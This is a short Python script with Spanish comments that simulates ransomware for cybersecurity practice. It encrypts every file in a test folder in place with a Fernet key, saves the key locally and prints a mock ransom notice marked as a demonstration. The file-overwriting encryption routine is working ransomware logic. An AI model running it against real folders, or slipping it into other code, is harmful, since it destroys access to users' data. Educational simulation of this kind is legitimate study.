# Importamos la clase Fernet de la librería cryptography.
# Fernet es una implementación de cifrado simétrico (usa la misma clave para cifrar y descifrar)
# que garantiza que el mensaje no pueda ser leído ni modificado sin la clave.
from cryptography.fernet import Fernet
import os  # Importamos 'os' para interactuar con el sistema operativo (listar archivos, rutas, etc.)

def load_key():
    """
    Carga la clave de encriptación desde el archivo 'filekey.key'.
    
    Returns:
        bytes: La clave de encriptación leída.
    """
    # Abre el archivo en modo 'rb' (read binary) porque las claves son bytes, no texto.
    return open("filekey.key", "rb").read()

def encrypt_files(key):
    """
    Recorre la carpeta especificada y cifra todos los archivos encontrados
    utilizando la clave proporcionada.

    Args:
        key (bytes): La clave generada por Fernet para realizar el cifrado.
    """
    # Inicializamos el objeto Fernet con la clave proporcionada.
    fernet = Fernet(key)
    
    # Definimos la carpeta objetivo. 
    # PRECAUCIÓN: Asegurarse de que esta carpeta exista y contenga solo archivos de prueba.
    directory = "carpeta_de_prueba"

    # os.listdir genera una lista con los nombres de los archivos en ese directorio
    for file_name in os.listdir(directory):
        # Construimos la ruta completa del archivo (ej. "carpeta_de_prueba/archivo.txt")
        # Es mejor usar os.path.join que concatenar strings manualmente para compatibilidad entre S.O.
        file_path = os.path.join(directory, file_name)

        # Verificamos si la ruta es un archivo (y no una subcarpeta) para evitar errores
        if os.path.isfile(file_path):
            
            # 1. LEER LOS DATOS ORIGINALES
            # Abrimos el archivo en modo lectura binaria ('rb').
            # Es crucial usar binario para no corromper formatos como imágenes, PDFs, etc.
            with open(file_path, "rb") as file:
                file_data = file.read()

            # 2. ENCRIPTAR LOS DATOS EN MEMORIA
            # El método encrypt toma los bytes originales y devuelve bytes cifrados.
            encrypted_data = fernet.encrypt(file_data)

            # 3. SOBRESCRIBIR EL ARCHIVO CON LOS DATOS CIFRADOS
            # Abrimos el mismo archivo en modo escritura binaria ('wb').
            # Esto borra el contenido anterior y escribe el contenido cifrado.
            with open(file_path, "wb") as file:
                file.write(encrypted_data)

# --- INICIO DEL FLUJO DE EJECUCIÓN ---

# Generamos una nueva clave aleatoria. 
# Esta clave es INDISPENSABLE para recuperar los archivos. Si se pierde, los datos se pierden.
key = Fernet.generate_key()

# Guardamos la clave inmediatamente en un archivo local.
# Se usa 'wb' porque la clave es una secuencia de bytes.
with open("filekey.key", "wb") as file:
    file.write(key)

# Llamamos a la función principal para cifrar el contenido de la carpeta.
encrypt_files(key)

# --- Mensaje de rescate SIMULADO (solo demostrativo) ---
# Informamos al usuario de lo que acaba de suceder.
print("\n==============================================")
print("   ATENCIÓN: ESTE ES UN MENSAJE DE PRUEBA")
print("==============================================")
print("Tus archivos en 'carpeta_de_prueba' han sido CIFRADOS")
print("Clave almacenada en: filekey.key")
print("Este mensaje es solo una simulación para prácticas de ciberseguridad.")
print("NO es un ransomware real ni bloquea tu acceso.")
print("==============================================\n")